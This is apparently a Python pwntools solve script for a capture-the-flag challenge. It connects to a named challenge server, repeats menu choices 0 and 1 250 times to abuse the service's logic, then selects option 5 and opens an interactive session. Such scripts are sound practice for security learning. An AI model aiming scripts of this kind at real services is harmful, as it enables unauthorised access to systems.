from pwn import *

host, port = 'chals20.cybercastors.com', 14432

r = remote(host, port)

print r.recvuntil('Choice: ')
r.sendline('6')

for i in range(250):
    print ' [%d]---------------------------------' %i
    print r.recvuntil('Choice: ')
    r.sendline('0')
    print r.recvuntil('Choice: ')
    r.sendline('1')

r.sendline('5')
print r.recv()
r.interactive()


